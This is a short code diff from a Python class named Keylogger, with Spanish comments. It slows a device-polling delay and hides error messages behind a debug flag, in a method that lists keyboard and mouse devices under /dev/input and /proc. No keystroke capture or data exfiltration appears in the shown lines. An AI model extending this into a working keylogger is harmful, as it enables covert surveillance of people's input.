@@ -201,7 +201,8 @@ class Keylogger:
         los devuelve.
         """
 
-        sleep(0.1)
+        sleep(0.2)
+
         try:
             #keyboard = subprocess.getoutput('cat /proc/bus/input/devices | grep -i -w "keyboard"')
             #sleep(0.1)
@@ -211,9 +212,11 @@ class Keylogger:
             #return subprocess.getoutput('ls /dev/input/by-id/') + keyboard + mouse
             return subprocess.getoutput('ls /dev/input/by-id/; cat /proc/bus/input/devices | grep -i -w "keyboard"; cat /proc/bus/input/devices | grep -i -w "mouse"')
         except Exception as e:
-            print('Ha ocurrido un problema al comprobar lista de dispositivos')
-            print('Esperando 30 segundos para reintentar')
-            print(e)
+            if self.has_debug:
+                print('Ha ocurrido un problema al comprobar lista de dispositivos')
+                print('Esperando 30 segundos para reintentar')
+                print(e)
+
             sleep(30)
             return ''
 
